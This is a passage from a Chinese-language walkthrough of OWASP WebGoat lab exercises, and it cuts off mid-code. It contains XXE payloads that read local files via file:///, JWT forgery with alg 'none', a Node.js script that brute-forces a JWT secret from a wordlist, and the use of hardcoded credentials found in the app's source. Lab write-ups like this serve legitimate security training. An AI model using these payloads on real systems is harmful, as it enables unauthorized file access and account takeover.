d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"xxe\">XXE<a href=\"#xxe\" class=\"hash-link\" aria-label=\"XXE的直接連結\" title=\"XXE的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-3\">Q3<a href=\"#q3-3\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>利用 OWASP 攔截送出的請求，並改成：</p><div class=\"language-xml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-xml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token prolog\">&lt;?xml version=&quot;1.0&quot; encoding=&#x27;UTF-8&#x27;?&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;!</span><span class=\"token doctype doctype-tag\" style=\"color:rgb(199, 146, 234);font-style:italic\">DOCTYPE</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype name\" style=\"color:rgb(199, 146, 234);font-style:italic\">comment</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">[</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  </span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\">!ELEMENT</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">comment</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">(#PCDATA)</span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">]</span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token entity named-entity\">&amp;xxe;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p><img loading=\"lazy\" src=\"../../../i.imgur.com/zmH3ccg.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q4\">Q4<a href=\"#q4\" class=\"hash-link\" aria-label=\"Q4的直接連結\" title=\"Q4的直接連結\">​</a></h4><p>一樣利用 OWASP 攔截送出的請求，先將 <code>Content-Type</code> 改成 <code>application/xml</code>，在 body 的部分一樣改成：</p><div class=\"language-xml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-xml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token prolog\">&lt;?xml version=&quot;1.0&quot; encoding=&#x27;UTF-8&#x27;?&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;!</span><span class=\"token doctype doctype-tag\" style=\"color:rgb(199, 146, 234);font-style:italic\">DOCTYPE</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype name\" style=\"color:rgb(199, 146, 234);font-style:italic\">comment</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">[</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  </span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\">!ELEMENT</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">comment</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">(#PCDATA)</span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">]</span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token entity named-entity\">&amp;xxe;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/XgGTXsm.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q7未解\">Q7（未解）<a href=\"#q7未解\" class=\"hash-link\" aria-label=\"Q7（未解）的直接連結\" title=\"Q7（未解）的直接連結\">​</a></h4><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"authentication-flaws\">Authentication Flaws<a href=\"#authentication-flaws\" class=\"hash-link\" aria-label=\"Authentication Flaws的直接連結\" title=\"Authentication Flaws的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"authentication-bypasses\">Authentication Bypasses<a href=\"#authentication-bypasses\" class=\"hash-link\" aria-label=\"Authentication Bypasses的直接連結\" title=\"Authentication Bypasses的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-1\">Q2<a href=\"#q2-1\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>一樣透過 OWASP 攔截送出去的請求，並修改 <code>secQuestion0</code> 和 <code>secQuestion1</code> 的欄位名稱：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/ZMSykyY.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"jwt-token\">JWT Token<a href=\"#jwt-token\" class=\"hash-link\" aria-label=\"JWT Token的直接連結\" title=\"JWT Token的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q4-1\">Q4<a href=\"#q4-1\" class=\"hash-link\" aria-label=\"Q4的直接連結\" title=\"Q4的直接連結\">​</a></h4><p>利用 OWASP 攔截伺服器回來的回應，並將 <code>access_token</code> 中：</p><ul><li><code>HEADER</code> 改成 <code>{&quot;alg&quot;: &quot;none&quot;}</code></li><li><code>PAYLOAD</code> 中的 <code>admin</code> 改成 <code>true</code></li><li>把 <code>signature</code> 的部分拿掉</li></ul><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/u8PLKwl4xbw&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q5\">Q5<a href=\"#q5\" class=\"hash-link\" aria-label=\"Q5的直接連結\" title=\"Q5的直接連結\">​</a></h4><p>利用 Hint 中提供的 <a href=\"https://github.com/first20hours/google-10000-english\" target=\"_blank\" rel=\"noopener noreferrer\">google 10000 個英文單字</a> 進行暴力破解（brute-force attack），在這裡我們使用 JS 搭配套件 <a href=\"https://www.npmjs.com/package/jsonwebtoken\" target=\"_blank\" rel=\"noopener noreferrer\">jsonwebtoken</a> 進行暴力破解：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> commonWords </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">require</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;./google-10000-english.json&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> jwt </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">require</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;jsonwebtoken&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> token </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 如果 secret 正確則會直接透過 console.log 顯示，否則進入 catch 不做事</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">commonWords</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">forEach</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">word</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword control-flow\" style=\"font-style:italic\">try</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token keyword\" style=\"font-style:italic\">var</span><span class=\"token plain\"> decoded </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> jwt</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">verify</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">token</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> word</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;valid secret: &#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> word</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token plain\"> </span><span class=\"token keyword control-flow\" style=\"font-style:italic\">catch</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">error</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// console.log(&#x27;invalid&#x27;, word);</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>結果顯示 JWT 的 secret key 為 <code>victory</code>：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/uYg9uya.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>取得 secret key 後，把原本的 JWT Token 貼到 <a href=\"https://jwt.io/\" target=\"_blank\" rel=\"noopener noreferrer\">jwt.io</a> 後可以看到 payload，將 <code>username</code> 改成 <code>WebGoat</code> 後複製新的 Token 使用即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/I2l0UZo.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q7-1\">Q7<a href=\"#q7-1\" class=\"hash-link\" aria-label=\"Q7的直接連結\" title=\"Q7的直接連結\">​</a></h4><p>在 WebGoat 的程式<a href=\"https://github.com/WebGoat/WebGoat/blob/4d7d0058c3ba0b4e542ed7e964ee1056207b7a08/webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/plugin/JWTRefreshEndpoint.java\" target=\"_blank\" rel=\"noopener noreferrer\">原始碼</a>中，可以看到有一組寫死的帳號密碼在內：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/nSVKjFS.png\" alt=\"imgur\" class=\"img_ev3q\"></p><blockquote><p>可以直接在 WebGoat 的 Github 專案內搜尋 <code>JWT/refresh</code> 即可找到該檔案。</p></blockquote><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">user</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Jerry&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">password</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;bm5nhSkxCXZkKRy4&#x27;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著利用這組帳號密碼去執行登入：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 取得 Jerry 的 refresh_token</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;http://localhost:8080/WebGoat/JWT/refresh/login&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">headers</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token string-property property\">&#x27;Content-Type&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;application/json; charset=UTF-8&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">body</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token known-class-name class-name\" style=\"color:rgb(255, 203, 107)\">JSON</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">stringify</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">user</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Jerry&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">password</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;bm5nhSkxCXZkKRy4&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">method</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span 